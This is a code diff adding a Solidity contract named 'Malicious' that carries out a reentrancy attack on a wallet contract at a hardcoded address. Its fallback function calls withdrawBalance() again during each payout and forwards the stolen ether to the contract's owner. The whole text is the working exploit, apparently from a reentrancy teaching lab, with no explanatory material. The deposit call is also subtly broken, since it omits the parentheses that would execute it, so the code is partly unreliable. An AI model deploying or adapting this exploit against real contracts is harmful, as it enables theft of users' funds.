@@ -1,0 +1,35 @@
+pragma solidity ^0.5.8;
+
+import "./VulnerableWallet.sol";
+
+
+contract Malicious {
+    address payable public owner;
+    uint public value;
+    Wallet wallet;
+    
+    constructor() public {
+        owner = msg.sender;
+        wallet = Wallet(0x7a8e718B35A080fd6b4596d742086f0C9928b447); 
+    }
+    
+    function deposit() public payable {
+        wallet.deposit.value(msg.value);
+    }
+    
+    function withdraw() external payable {
+        wallet.withdrawBalance();
+    }
+    
+    function() external payable{
+        owner.transfer(msg.value);
+        if (value < 2) {
+            value += 1;
+            wallet.withdrawBalance();
+        }
+    }
+
+    function get_balance() view external returns (uint256) {
+        return address(this).balance;
+    }
+}
